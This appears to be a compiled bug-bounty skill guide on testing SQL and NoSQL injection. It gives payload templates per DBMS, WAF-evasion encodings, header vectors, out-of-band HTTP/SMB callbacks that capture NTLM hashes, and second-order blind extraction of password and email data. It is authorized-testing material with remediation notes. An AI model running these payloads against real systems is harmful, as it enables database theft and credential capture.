# general-technique — part 4/45 (99 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| DB error text leaks in response (ORA-, MySQL syntax, Postgres at/`)` ) | Error-based schema extraction | `references/variants-1.md` §V-01 |
| Different column counts rejected; extra columns visible in output | Union-based data retrieval | `references/variants-1.md` §V-02 |
| Response content/length flips on `1=1` vs `1=2`, no errors shown | Boolean-based blind | `references/variants-1.md` §V-03 |
| Response delays track injected condition or `SLEEP`/`WAITFOR`/`pg_sleep` | Time-based blind | `references/variants-1.md` §V-04 |
| Out-of-band callback arrives at your Burp/Collaborator/DNSlog server | OOB / DNS exfiltration | `references/variants-1.md` §V-05 |
| Multiple statements accepted; `;` runs a second query | Stacked / batch execution | `references/variants-1.md` §V-06 |
| Input stored now, exploited later on a re-query (profile, ticket, import) | Second-order injection | `references/variants-1.md` §V-07 |
| Injectable value only reaches SQL inside JSON/XML/GraphQL body | Transport-embedded parametric SQLi | `references/variants-1.md` §V-08 |
| Response reorders/pages when `sort`, `order`, `limit`, `offset` change | ORDER BY / GROUP BY / LIMIT structural | `references/variants-2.md` §V-09 |
| File read/write, shell, or program execution possible on a known DBMS | DB-specific command execution | `references/variants-2.md` §V-10 |
| WAF blocks obvious payloads; comment/whitespace variants slip through | WAF impedance mismatch | `references/variants-2.md` §V-11 |
| Only specific exotic-looking payloads trigger; timing still works | Polyglot delay evasion | `references/variants-2.md` §V-12 |
| Backend is MongoDB/DynamoDB/Couch; `$gt`/`$ne` filters change result sets | NoSQLi operator substitution | `references/variants-2.md` §V-13 |
| Boundary value accepted where one char longer is rejected; injection at limit | Truncation-based injection | `references/variants-2.md` §V-14 |
| Stored payload + later blind read, character-by-character confirmation | Second-order blind char-by-char | `references/variants-2.md` §V-15 |
| Injected only via `User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For` | Header-based vectors (all variants) | `references/payloads.md` §5 |
| Payload needs encoding to even reach the sink | Encoding/URL/hex/unicode bypass | `references/payloads.md` §4 |
| `OR 1=1` blocked but `||1=1`, `&&`, `!` behave differently | Case/logical-operator bypass | `references/payloads.md` §4 |
| Quote breaks out but payload length is capped | Truncation + concatenation | `references/variants-2.md` §V-14 |
| Blind + OOB HTTP/SMB requested (no DNS egress available) | Blind OOB HTTP/SMB variants | `references/payloads.md` §6 |

## [Bugbountyskills.md] 4. Verification standard

A **confirmed finding** requires all three:

1. **Reproducible request/response pair** — the exact request (URL, method, headers,
   body) that triggers the issue, plus the response that shows it, reproducible at
   least 3 times in a row from a clean session (no cache, fresh auth).
2. **Minimal-impact impact proof** — a boolean/timing oracle, or read-only
   extraction of data you are authorized to read. Never a destructive or DoS payload.
3. **A false-positive check** — one independent second signal: a different oracle
   (timing vs boolean vs OOB), a different payload family, or a code-level
   confirmation of the sink. Note in the report what you ruled out (caching, WAF
   templates, network jitter).

A **lead** (not reportable on its own): a single anomalous response, a generic 500,
a page that is merely slow, an error message with no injectable confirmation, or a
tool's "possible injection" heuristic without your own reproduction. Mark leads as
needs-more-work and pick the next variant from §3.

Severity framing: data extraction from a multi-tenant DB → high/critical; boolean or
time oracle with no useful data exposed → medium; read of low-sensitivity config on
an authenticated low-priv account → medium (context-dependent); DoS-shaped behavior
from heavy queries → note it, but only as a secondary observation if in scope.

## [Bugbountyskills.md] Steps to reproduce

1. Authenticate as <role> (or unauthenticated), obtain session cookie.
2. Send the baseline request:
   ```http
   <exact request with <PLACEHOLDER> values filled in>
   ```
3. Send the trigger request (differential):
   ```http
   <trigger request>
   ```
4. Observe: baseline returns <>, trigger returns <> — difference <byte length,
   time delta, error text>.
5. Repeat 3x; results are stable. Independent second signal: <timing/OOB/code review>.

## [Bugbountyskills.md] Impact

<Who can do this, unauthenticated/authed, what data is readable, what actions are
possible — phrased as a concrete attacker capability, e.g. "any unauthenticated
visitor can extract email and password-hash columns from the users table one
character at a time using a boolean oracle, at ~1 row per N requests.">

## [Bugbountyskills.md] Remediation

<Specific to the variant: parameterized query/prepared statement for the string
concat, allow-list for ORDER BY identifiers, cast to int for LIMIT, remove
CONCAT-built dynamic SQL, disable xp_cmdshell, document-level validation for
NoSQL operators, plus WAF as defense-in-depth not as the fix.>

## [Bugbountyskills.md] References

- CWE-89 (SQL Injection), CWE-943 (NoSQL Injection), CWE-564 (SQL Injection: Hibernate)
- OWASP A03:2021 Injection; OWASP Testing Guide WSTG-INP-* ; PortSwigger <variant> labs
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for variants 1-8 and `references/variants-2.md` for
variants 9-15; each file opens with a table of contents linking every section. Read
`references/payloads.md` when you need request templates, the DBMS payload ladder,
tool commands (sqlmap flag templates, curl/ffuf one-liners), WAF-evasion encoding
tables, header-based vectors, or the "chain it with" cross-skill notes.

Read `## >> sqli-testing — core black-box scanning methods (book extract: Chalmers 2021)`
for the method layer beneath this workflow: the nine-class attack taxonomy as a coverage
checklist (§B-1), the node/endpoint inventory method with the per-node sqlmap command
shape (§B-2), the eight scanner failure modes proven with server-side coverage data —
stop-after-first-param, JS-generated params, auth re-crawl gaps, iframe blindness,
hidden POST params, inter-state dependencies, loop starvation, coverage ≠ detection
(§B-3), differential detection and DBMS-fingerprint-first (§B-4), defense recognition
that tells you which payloads are even possible (§B-5), and the coverage-first engagement
loop (§B-6).

The suite cross-references by directory name: injection that yields file/shell
capability chains into `rce-testing`; schema extraction paired with leaked
`.env` credentials chains into `info-disclosure-testing`; authenticated parameter
manipulation chains into `bac-idor-testing`; injection discovered through reflected
input chains into `xss-testing` for context-appropriate escaping review.

## [Bugbountyskills.md] Table of contents

1. [Detection ladder: safe probe → differential → confirmation](#1-detection-ladder-safe-probe--differential--confirmation)
2. [Payload templates per DBMS](#2-payload-templates-per-dbms)
3. [Tool invocation templates](#3-tool-invocation-templates)
4. [WAF-evasion encoding / obfuscation table](#4-waf-evasion-encoding--obfuscation-table)
5. [Header-based vectors](#5-header-based-vectors)
6. [Blind OOB HTTP/SMB variants](#6-blind-oob-httpsmb-variants)
7. [Time-based confirmation: differential timing, not fixed sleeps](#7-time-based-confirmation-differential-timing-not-fixed-sleeps)
8. [Chain it with (suite cross-references)](#8-chain-it-with-suite-cross-references)

---

## [Bugbountyskills.md] 1. Detection ladder: safe probe → differential → confirmation

Never jump rungs. Each rung has an exit criterion and a bail-out.

**Rung 0 — Baseline capture (no injection).**
Send the unmodified request 3×; record status, length, body hash, mean time.
Replace nothing yet. Exit: you have a stable reference (or you know the noise floor
±N bytes / ±X ms). Bail: if the baseline itself is nondeterministic (nonces,
timestamps), find a stable comparison axis (row presence, error class) first.

**Rung 1 — Safe probe (does syntax reach the DB?).**
- String context: `'` (single quote), `' '` (quote + space), `\` (backslash, MySQL escape-pair), `"` if double-quoted.
- Numeric/identifier context: `1 AND 1`, `1' AND '1'='1` shaped probes are already *differential* — keep them for rung 2; rung 1 just needs *any* parser reaction.
- Comment probe: `1--`, `1#`, `1-- -` (Oracle/* need `-- ` trailing space or `#`).
Exit: error text / status change / empty result vs baseline → you have a *lead*.
Bail: identical responses 3/3 → try the other context (int vs string vs header,
V-08 transports) or move on; don't escalate blindly.

**Rung 2 — Differential test (is it MY condition?).**
Send the *pair*, never payload-vs-baseline:
- Boolean pair (V-03): `' AND 1=1-- ` vs `' AND 1=2-- ` — observe row count/content/status.
- Quote-balance pair: `' AND 'a'='a` vs `' AND 'a'='b`.
- Time pair (V-04): `IF(1=1,SLEEP(<n>),0)` vs `IF(1=2,SLEEP(<n>),0)` — §7 method.
Exit: the *pair* flips deterministically 3/3 → proceed to confirmation.
Bail: both branches behave alike, or flips are jittery → FP filter (V-03/V-04 false-positives sections: caches, WAF shape-delays, dynamic content).

**Rung 3 — Confirmation (second, independent signal).**
Pick a signal *different* from the one that gave you the lead:
- Error lead → boolean flip + timing delta.
- Boolean lead → timing delta or OOB callback (V-05) or ground-truth match (extract a value you already know: your own username's first char).
- Timing lead → boolean flip anywhere in the app, or OOB, or engine error on `CAST` (V-01).
- Also confirm *falseness control*: made-false payload → effect gone (3/3).
Exit: two independent signals + false-condition control = **confirmed** (report per
`SKILL.md` §4-5). One signal = lead, keep it in notes.

**Extraction rung (post-confirmation, authorized data only).** Switch to the
extraction shape of your variant (union rows / error windows / boolean binary search
/ OOB labels), stay read-only, own-account or aggregate proof only, and pace requests
(no bursts, no sleep loops — DoS guardrail).

---

## [Bugbountyskills.md] 2. Payload templates per DBMS

`<BASE>` = the benign baseline value of the parameter. `<SUB>` = your subquery
(read-only). `<N>` = delay seconds (1-3). Replace placeholders; adjust quotes to the
literal context (remove the leading `'` for unquoted/numeric slots).

### [Bugbountyskills.md] Oracle

| Purpose | Template |
|---|---|
| String probe | `<BASE>'` (needs `FROM dual` in unions) |
| Error engine | `<BASE>' AND 1=CTXSYS.DRITHSX.SN(1,(<SUB>))-- ` |
| Error alt | `<BASE>' AND 1=TO_NUMBER((<SUB>))-- ` (or `UTL_INADDR`-flavored) |
| Union | `<BASE>' UNION ALL SELECT <expr> FROM dual-- ` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Time | `<BASE>' AND CASE WHEN (<COND>) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',<N>) ELSE 0 END=1-- ` |
| String | `SUBSTR`, `ASCII`, `||` concat, `ROWNUM` for paging |
| OOB/network | `UTL_HTTP.REQUEST('http://<NONCE>.<OAST>')` → V-05 |

Schema: `all_tables`, `all_tab_columns`, `all_users`, `user`, `v$version`, `ROWNUM`.

## [Bugbountyskills.md] 4. WAF-evasion encoding / obfuscation table

Test each in *both* raw and encoded form (decode pipeline: proxy → WAF → app → DB).
One change per request — never assume which layer ate the payload (V-11).

| Target char / token | Transformation | Example output | Notes |
|---|---|---|---|
| `'` quote | URL-encode | `%27` | universal first try |
| `'` quote | Double-encode | `%2527` | needs double-decode app / WAF single-decode |
| `'` quote | SQL quote-doubling | `''` | inside quoted literals |
| space | Tab / newline / VT / CR | `%09` `%0a` `%0b` `%0d` | MySQL accepts; splits `UNION\s+SELECT` regexes |
| space | Inline comment | `/**/` | `UNION/**/SELECT`, `IF(**,SLEEP(2),0)` |
| space | Paren adjacency | `IF(...)` | no space needed before `(` |
| `UNION SELECT` | Comment-joined | `UNION/**/SELECT` | keep tokens adjacent-joined too: `UNI/**/ON` |
| keywords | Case randomization | `SeLeCT`, `uNiOn` | SQL keywords case-insensitive; WAF often not |
| keyword letter | Percent-encode one letter | `%53ELECT` (`S`→`%53`) | encode inside the token |
| keyword | MySQL versioned comment | `/*!50000UNION*/` | MySQL executes inside `/*!...*/`, WAF may not parse |
| `OR` / `AND` | Logical alternatives | `\|\|` `&&` `!` | MySQL; `%7c` `%26` for `|` `&` |
| `=` | Comparison alternatives | `<>` `!=` `LIKE` `RLIKE` | `AND 1<>2` etc. |
| string literal | Hex literal | `0x61646d696e` | no quotes at all (MySQL) |
| string literal | CHAR/CONCAT build | `CHAR(97,98,99)` | defeats literal-matching filters (V notes: concat obfuscation) |
| string literal | Postgres decode | `chr(97)\|\|chr(98)`, `decode('61','hex')` | quoteless on PG |
| `-- ` comment | Variants | `--%20` `#` `;%23` | `#` MySQL only; Oracle needs `-- ` (trailing space) |
| `SLEEP`/`WAITFOR` | Split + comment | `SL/**/EEP(2)`, `WAITFOR/**/DELAY` | pair with §7 differential |
| Unicode | Fullwidth / NFKC fold | `＇` `%ef%bc%87` | only if a normalizer folds before SQL |
| Unicode | Overlong UTF-8 | `0xC0 0xA7` | rare; Java/PHP legacy filters |
| payload chunk | Base64 wrapper | `<b64(payload)>` | only when app decodes base64 pre-query |
| `;` stacked | Encoded separator | `%3b`, `;%0a` | V-06 + V-11 |
| whole payload | JSON/XML body move | see V-08 | WAF inspects query string only |
| payload order | Query-string smuggling | param placed in `Referer`/`X-Forwarded-*` | §5 headers |

Escape hatch: if the WAF blocks *all* quote forms, switch variant (identifier
context V-09, NoSQL operators V-13, truncation V-14) instead of encoding forever.

---

## [Bugbountyskills.md] 5. Header-based vectors (User-Agent, Referer, Cookie)

Headers reach SQL sinks that are invisible to parameter scanners — log insertion
(`INSERT INTO access_log ...` — second-order via V-07 when admins view logs),
session lookup (`WHERE session='<Cookie>'`), geo/rate-limit lookups, analytics.
Probe every variant's ladder through, in likelihood order:

| Header | Typical sink | Probe (then full ladder) |
|---|---|---|
| `Cookie: <KEY>=<VAL>` | session/cache lookup | `<VAL> = <BASE>'` → boolean pair → §7 timing |
| `User-Agent:` | access-log INSERT | `<BASE>'` → rung 2 → **trigger the consumer** (visit any page that renders logs) |
| `Referer:` | analytics/redirect-check tables | same as UA |
| `X-Forwarded-For` / `X-Real-IP` | geo/rate-limit/whitelist SQL | `<BASE>'` , `1 OR 1=1` |
| `X-Request-Id` / `Correlation-Id` | tracing DB inserts | `'` probe + consumer trigger |
| Custom `X-*` the API documents | anything | ffuf header fuzzing (`§3`) |

Notes: raw spaces/newlines may need `%09`/`%0a` (HTTP forbids bare ones); the
`Cookie` value often needs the *session token preserved* — inject in a **second**
cookie (`tracking=<PAYLOAD>`), never clobber your own auth; log-based hits are
**second-order**: confirm via V-07 (write then view the log page), not by the
response of the request that set the header.

---

## [Bugbountyskills.md] 6. Blind OOB HTTP/SMB variants (no DNS egress)

When V-05's DNS channel is filtered but TCP works — or when you want a *boolean via
callback presence*:

- **HTTP callback, Oracle:** `' AND UTL_HTTP.REQUEST('http://<NONCE>.<OAST-HOST>/<CHAR>') IS NOT NULL-- ` — encode data in the path (`/<offset>-<char>`), one char per probe.
- **HTTP callback, SQL Server:** `'; EXEC master..sp_addlinkedsrvlogin ...`/`OPENROWSET` shapes, or `xp_fileexist 'http://...'` where applicable → keep read-only; primary primitive: `xp_dirtree '\\<HOST>\<SHARE>\<NONCE>'`.
- **SMB/UNC, SQL Server:** `xp_dirtree '\\<OAST-SMB-HOST>\<SHARE>\<NONCE>'` / `LOAD_FILE('\\\\<HOST>\\x')` — your listener on 445 receives the service account's NTLMv2 challenge/response = **credential material** (redact hashes in public reports; note chain to `info-disclosure-testing`).
- **SMB/UNC, MySQL:** `' AND LOAD_FILE('\\\\<HOST>\\<NONCE>')-- ` (needs `FILE`).
- **Conditional-fetch boolean (no data encoding needed):** wrap the fetch in
  `CASE WHEN (<COND>) THEN <fetch> END` — callback = true, silence = false.
  Confirmation: callback tracks the condition truth 3/3 with **fresh nonce per
  probe**; rule out wildcard DNS and client-side fetches (verify source IP is the
  DB host, V-05 FP list).
- **Guardrail:** these are *read/notify* primitives only — never OOB-delete,
  never write files outside your own lab, never hammer callbacks (rate: a probe
  burst is a DoS on *your* listener and noisy on theirs — pace it).

---

## [Bugbountyskills.md] 8. Chain it with (suite cross-references)

| Chain | From this skill | To | What to hand off |
|---|---|---|---|
| **DB-specific command execution → RCE/SSRF** | V-10 (`INTO OUTFILE`/`LOAD_FILE`, `xp_cmdshell`, `COPY ... TO/FROM PROGRAM`, `UTL_HTTP`/`DBMS_SCHEDULER`, SQLite `ATTACH`/`load_extension`), OOB HTTP/SMB §6 | **`rce-testing`** | Privilege-confirmed command/file primitive: shell-command shaping (`whoami` proof), NTLM-relay/SSRF-flavored OAST callbacks, outfile→webshell upload validation, `$where`/UDF paths. Report SQLi as the delivery vector; let that skill carry the RCE/SSRF impact framing. |
| **Schema + credential combo** | V-01 error schema, V-02 union dump, V-15 blind extraction (table/column names, `users`, `settings`, `config`) | **`info-disclosure-testing`** | Extracted schema + reachable file reads (`LOAD_FILE` of app config) cross-referenced with leaked `.env`/config credentials — where do the extracted creds actually unlock something? Pairs schema dumps with `.git`/`.env`/s3/secret leaks for a combined impact story. |
| **Authenticated parameter tampering** | V-02/V-03 payloads inside authenticated endpoints, V-09 `offset`/`limit` paging abuse, V-13 operator injection on `userId`-style filters | **`bac-idor-testing`** | Injection-assisted access control: negative-value IDs, operator-bypassed ownership filters (`{"owner":{"$ne":"me"}}`), pagination that walks other users' rows, mass-assignment-adjacent params discovered during sink mapping. If the *only* bug is "I can read row 5 by changing 4→5" without SQL logic, it's BAC, not SQLi — hand it over. |
| Reflected input → XSS escaping gaps | Any variant where the payload echoes verbatim | `xss-testing` | Injection probes reflected unencoded (distinct finding, separate CWE). |
| Heavy-query / sleep abuse observations | V-04/V-12 timing side notes | `business-logic-testing` | If timing reveals a *race/logic* flaw beyond injection, hand that half off. |

## [Bugbountyskills.md] Table of contents

- [V-01: Database schema extraction via error-based SQL injection engines](#v-01-database-schema-extraction-via-error-based-sql-injection-engines)
- [V-02: Cross-table arbitrary data retrieval via union-based SQL injection compilation](#v-02-cross-table-arbitrary-data-retrieval-via-union-based-sql-injection-compilation)
- [V-03: Inferential data exfiltration via boolean-based blind SQL inferences](#v-03-inferential-data-exfiltration-via-boolean-based-blind-sql-inferences)
- [V-04: Asynchronous database delay evaluation via time-based blind SQLi conditions](#v-04-asynchronous-database-delay-evaluation-via-time-based-blind-sqli-conditions)
- [V-05: Out-of-band data exfiltration via DNS logging protocols](#v-05-out-of-band-data-exfiltration-via-dns-logging-protocols)
- [V-06: Multi-stage query execution via stacked command separators](#v-06-multi-stage-query-execution-via-stacked-command-separators)
- [V-07: Downstream persistence exploitation via second-order SQL injection pipelines](#v-07-downstream-persistence-exploitation-via-second-order-sql-injection-pipelines)
- [V-08: Transport-layer bypasses via JSON, XML and GraphQL embedded parametric SQLi](#v-08-transport-layer-bypasses-via-json-xml-and-graphql-embedded-parametric-sqli)

---

## [Bugbountyskills.md] V-06: Multi-stage query execution via stacked command separators and batch execution

**Mechanism:** The attacker terminates the original statement with `;` and appends a
second statement executed by the same driver — turning a read-only sink into
anything the driver allows (a `SELECT` for data, or a DDL/DML command when allowed).
Stacked capability changes the game: it enables second-order writes (V-07),
`INTO OUTFILE` staging (V-10), and multi-stage payloads. The violated assumption:
"one input = one statement" — true for strict prepared-statement drivers, false for
multi-statement connectors (OLE DB/ODBC with MARS, mysqli with `multi_query`,
psycopg `execute` with `;`, JDBC allowMultiQueries).

**Preconditions:**
- The driver/API allows multi-statement execution (`allowMultiQueries=true`, `PDO::MYSQL_ATTR_MULTI_STATEMENTS`, `MARS`, psycopg2 default, JDBC URL flag).
- Semicolons reach the query unfiltered (WAF may strip `;` — bypass in V-11).
- The second statement is executed synchronously in the same request (no splitting across connections).

**Detect:**
1. Harmless stack probe: `'; SELECT 'stacked_probe_12345'-- ` (string context) or `1;SELECT 12345` (numeric). Look for the second statement's output, or any behavior change.
2. Probe *side-effect-free* second statements first: `'; SELECT SLEEP(2)-- ` → a 2s delay proves two statements ran even if output is discarded. Differential: baseline vs `;`-payload timing (V-04 method).
3. Error differentiation: `'; SELECT 1 FROM nonexistent_tbl-- ` should produce a *different* error (missing table) than the baseline syntax error — the error proves the second statement parsed.
4. If `;` is stripped but `;/**/` or `%3b` works, note the bypass for V-11.
5. Check whether the app surfaces batch output (some return only the last statement's rows — juniors think the stack "failed" when it actually executed silently).

**Proof of concept:**
- Read-only stack (preferred proof): `'; SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- `
- Conditional-delay stack: `'; SELECT CASE WHEN <condition> THEN SLEEP(2) ELSE 0 END-- `
- Identifier stack for schema work: `'; SELECT version();-- ` (MySQL `-- ` needs trailing space; MSSQL `;--` fine).
- **Do not** run `'; DROP TABLE ...` or `'; UPDATE ...` against third-party targets to "prove" stacking. Prove it with a second `SELECT` or a conditional delay — read-only evidence is just as convincing to triage and far safer.

**Confirm:** Two signals: (a) the second statement's *distinct* effect (its output
value, its specific error, or its conditional delay) attributable only to a
successfully executed second statement, and (b) absence of the effect when the `;`
is removed or the second statement is made false. That A/B is the proof.

**False positives:** WAF/sanitizer echoes of the injected text (looks like second
output but is reflection); a `;`-bearing payload changing the *first* statement's
parse so the app falls back to an error page with 200-ish content; JSON bodies where
`;` is literal data (V-08 context — the "stack" never reached SQL); and ODBC drivers
that execute only the first statement — a `SLEEP` in statement 2 not delaying is
*inconclusive*, not proof of failure. Also: some DBs (Postgres protocol) natively
multi-statement while others (SQLite through some wrappers) do not — engine check.

**Impact:** Escalates severity: read-anything (stacked `SELECT`), and where writes
are reachable, defacement/logic-bypass via `UPDATE`-shaped payloads *only in
authorized labs*; report the capability with read-only proof and note the write
potential in Impact.

**Remediation:** Prepared statements (they cannot stack); disable
`allowMultiQueries`/MARS where not needed; parameterize rather than filter `;`.

**CWE / OWASP:** CWE-89 — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] Table of contents

- [V-09: Structural query manipulation via ORDER BY, GROUP BY and LIMIT/OFFSET exploits](#v-09-structural-query-manipulation-via-order-by-group-by-and-limitoffset-exploits)
- [V-10: Database-specific command execution](#v-10-database-specific-command-execution-mysql-into outfileload_file-mssql-xp_cmdshell-postgresql-copy-tofrom-program-oracle-utl_httpsysdbsqlite)
- [V-11: WAF impedance mismatch via inline comment obfuscation and whitespace bypass](#v-11-waf-impedance-mismatch-via-inline-comment-obfuscation-and-whitespace-bypass-techniques)
- [V-12: Automated time-delay evasion via polyglot SQLi execution blocks](#v-12-automated-time-delay-evasion-via-polyglot-sqli-execution-blocks)
- [V-13: NoSQL injection (NoSQLi) document extraction via operator substitution](#v-13-nosql-injection-nosqli-document-extraction-via-operator-substitution)
- [V-14: Truncation-based SQL injection via database field length limits](#v-14-truncation-based-sql-injection-via-database-field-length-limits)
- [V-15: Second-order blind inferential character-by-character verification extraction](#v-15-second-order-blind-inferential-character-by-character-verification-extraction)
- [Cross-cutting notes](#cross-cutting-notes)

---

## [Bugbountyskills.md] V-11: WAF impedance mismatch via inline comment obfuscation and whitespace bypass techniques

**Mechanism:** The WAF pattern-matches the *raw* request text while the DBMS
*parses* it — different grammars, different acceptance. Inline comments
(`/**/`, `/*!50000...*/` MySQL versioned), whitespace alternatives (tab, newline,
`%09`, `/**/`, parentheses, `+` in POST bodies), backtick/slash tricks, and
comment-joined tokens (`UNION/**/SELECT`) let payload semantics survive while the
signature breaks. The violated assumption: "blocked payload = not injectable" —
only that *serialization* of it is.

**Preconditions:**
- WAF/IPS present (block page, 403 with signature name, request-time delta) — fingerprint it first (`Server`/`X-CDN` headers, block-page HTML).
- Injected value reaches SQL after any *decoded* normalization (double-decode mismatch — see encoding notes below).
- The DBMS accepts the obfuscated form (test locally against the fingerprinted engine).

**Detect:**
1. Establish the block baseline: send a naked `UNION SELECT`, note status/body/time (some WAFs *delay* instead of blocking — timing itself is a channel).
2. Binary-search which token trips it: test `UNION`, `SELECT`, `SLEEP`, `'` separately → map the signature set.
3. Re-encode the offending token only: `UNION/**/SELECT`, `UN/**/ION SEL/**/ECT`, `UNION%0aSELECT`, `UNION%09SELECT`, `/*!UNION*//*!SELECT*/`, `UN%49ON` (hex-ish via `%49`=I... use where allowed), `UNI%4fN` etc.
4. Whitespace ladder: space → tab → newline → `/**/` → newline+comment → paren-adjacent (`IF(...)` needs no space before `(`).
5. Case + logical-operator ladder (see cross-cutting notes): `SeLeCt`, `||`, `&&`, `!`, `%7c` (`|`), `%26` (`&`).
6. Confirm the *payload semantics* still execute at the DBMS (boolean flip or timing per V-03/V-04) — a WAF that passes garbage and a DB that ignores it is not a bypass.

**Proof of concept:**
- Comment-joined: `1'%2f**%2fUNION%2f**%2fSELECT%2f**%2fNULL,password%2f**%2fFROM%2f**%2fusers--%20`
- Versioned comment (MySQL): `1'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- `
- Whitespace-free: `1'OR(1=1)-- ` / `1'AND(ASCII(SUBSTR((SELECT%09user),1,1)))97-- ` (tab inside function args).
- Encoded quote: `%2527` (double-encoded), `%27`, `''` (SQL quote-doubling), Unicode `＇` (U+FF07) where the app normalizes fullwidth → ASCII (note: MySQL doesn't natively fold it — confirm normalization exists).
- Split-argument: `1'UNI%0bON SEL%0dECT...` (vertical tab/CR may pass both WAF and MySQL `UNION`).

**Confirm:** Same effect achieved by the obfuscated payload *and* the clean payload
when the WAF is bypassed (or from a different egress/tester IP that the WAF treats
differently). The delta "clean = 403, obfuscated = oracle flips" is the second
signal. Log both request variants as evidence.

**False positives:** WAF 403 re-attacks (rate limits making everything look
blocked) — **and the discriminator is the benign control: if a *harmless* value
(`A01WX` next to a baseline `A01W` that returned 200) also 403s, the block is
behavioural (bot score/rate), not payload-triggered, so your "injection was blocked"
reading is wrong. Akamai Bot Manager does exactly this — ~1–2 requests pass per burst,
then *everything* 403s at the edge in <0.3s regardless of input; cool-down ~30–45s
restores it. Space probes ≥35s instead of concluding the WAF saw your payload.** Also
**never read a CDN-cached error page as a backend/DB error**: a `503` carrying branded
maintenance text may be `server: AkamaiNetStorage` + `server-timing: cdn-cache; HIT` —
an edge-cached page unrelated to your payload, so the "quote caused a 503" inference is
pure noise. Check `cdn-cache`/`Server` before crediting the injection; only an *uncached*
app-origin error (`server-timing: origin; dur=…`, no `cdn-cache: HIT`) counts as a signal.
Challenges (JS/TLS fingerprinting) mistaken for injection blocks;
"bypass" payloads that return 200 because they were *ignored* (no injection —
compare against the boolean truth-flip, V-03 FP section); case variations that
MySQL accepts but the WAF *also* accepts (no net bypass — test, don't assume);
`/**/` inside a string literal being consumed as data not syntax; and encoding
bypasses undone by the app decoding *twice* (then your `%2527` never reaches SQL
as a quote). Juniors credit the WAF with blocking something that was actually
app-side validation — read the block source.

**Impact:** Reachability of otherwise-blocked sinks — elevates a "WAF is blocking
it" lead into a real finding; report WAF name + bypass serialization + oracle
proof; remediation must not be "the WAF will catch it."

**Remediation:** Parameterize (WAF as defense-in-depth only); normalize/validate
once, canonically, before query building; WAF rules on *decoded* values.

**CWE / OWASP:** CWE-89 (+ CWE-184 Incomplete Denylist) — OWASP A03:2021; WSTG-ERR-04/ WSTG-TECH "WAF fingerprinting" adjacency.

---

## [Bugbountyskills.md] V-15: Second-order blind inferential character-by-character verification extraction

**Mechanism:** The full pipeline: a payload is stored second-order (V-07 write
half), *and* the read-out is blind (V-03/V-04 inference, no reflected data), *and*
the unit of extraction is a per-character verification — the attacker plants a
condition in the stored field so the consumer's behavior (row visible vs hidden,
delay vs no delay) verifies one character of a *target* value at a time. It is the
slowest, most patient variant and the hardest to detect, because each individual
request looks like a normal page load by an innocent user — the SQL only ever
executes in the *other* request path (the consumer), detached from the attacker's
probe session. The violated assumption: "monitoring the write API catches
injection" — the malicious bytes are inert on arrival.

**Preconditions:**
- Stored field consumed by a query that concatenates (V-07 preconditions).
- Blind channels only: consumer shows no injected data directly (admin list with boolean effect, or a background report where only timing is visible).
- Patience + budget: ~7 requests per character *per consumer trigger* — plan request counts, sleep between bursts (DoS guardrail), and use binary search on ASCII not linear scans.
- Prefer own/aggregate data for proof (read-only guardrail).

**Detect:**
1. Confirm the V-07 pipeline first (stored quote breaks the consumer) — without a working consumer, this variant doesn't exist.
2. Confirm the consumer gives a *boolean or timing* observable: store a condition that makes your row disappear from a list you can view (`displayName = "' AND '1'='2'-- "` → your row vanishes), or store a conditional delay and trigger the consumer (V-04 method, measured on trigger).
3. Verify the delay/flip is consumer-triggered: sending the *stored payload* directly at the consumer as a *reflected* parameter must NOT reproduce it (else it's first-order, V-03).
4. Start extraction with a known ground-truth string (your own display name) — if the oracle recovers it byte-for-byte, the channel is real.
5. Then extract the target: `IF(ASCII(SUBSTR((SELECT ...),<offset>,1))=<code>,<visible-behavior>,<other>)` planted per probe, consumer triggered per probe.

**Proof of concept:**
- Plant (write, via parameterized INSERT): `PUT /api/profile {"displayName": "' OR IF(ASCII(SUBSTR((SELECT email FROM users WHERE id=1),1,1))=97,'1','0')='1'-- "}`
  (shape adapted so the consumer's row-set depends on the condition — concrete
  consumer: admin list `WHERE display_name='<stored>' OR '<stored>'='...'`.)
- Simpler boolean plant: `"' AND (ASCII(SUBSTR((SELECT <target>,<offset>,1))><mid>))-- "` → consumer shows/hides your row.
- Trigger (separate request/session): `GET /admin/users` (or whatever consumer you found) → row present = true bit.
- Timing variant: plant `x' AND IF(<cond>,SLEEP(2),0)-- `; trigger consumer; measure (differential, V-04 rules — the consumer's own load time is your baseline).
- Extract loop: binary search `ASCII` 32-126 → ~7 plant+trigger cycles per char; document request budget in the report.

**Confirm:** Ground-truth recovery: the oracle reproduces a value you already know
(own username/email prefix) exactly, 3/3, then the same method yields the target
value cross-checked by a *different* channel where available (e.g. compare first
chars extracted by timing vs boolean). Also confirm first-order impossibility:
reflected probes don't fire (step 3 above) — that rules out misclassified V-03.

**False positives:** Timing jitter on the consumer (reports are heavy — use the
consumer's own baseline distribution, V-04 FP rules); row visibility changing due
to *other* users' activity in the same list (isolate: compare only *your* row's
presence, or use a scoped consumer with a unique marker); caching of the consumer
page hiding your plant (force fresh sessions, cache-busting, or admin views that
bypass cache); pagination hiding your row (check all pages or filter); truncation
(V-14) mangling your plant so the condition is different from intended (read back
what was stored!); and concurrent profile updates overwriting your plant (re-plant
before each trigger, verify with read-back). The classic misread: the admin list
being *slow* because it is slow, not because of your `SLEEP`.

**Impact:** Stealthiest exfiltration: no data ever crosses the response, each
request looks benign, and the sink often runs with an admin/reporting DB role —
report the full write→trigger loop, per-char request math, and what class of data
became readable; emphasize the monitoring evasion angle (write-path logs show
nothing SQL-shaped firing).

**Remediation:** Parameterize the consumer query (the whole chain dies); validate
stored data at *use* time; alert on repeated profile-write + admin-list access
pairings and conditional-latency in report jobs.

**CWE / OWASP:** CWE-89 (second-order + blind) — OWASP A03:2021; WSTG-INP-04 (+ WSTG-INFO for the second-order data flow).

---

## [Bugbountyskills.md] Cross-cutting notes

Folding the supporting taxonomy into wherever it applies. Full encoder tables, tool
templates, and one-liners are in `payloads.md`.

### [Bugbountyskills.md] Header-based vectors (User-Agent, Referer, Cookie)

Headers routinely flow into SQL **unvalidated and unlogged** — access-log inserters
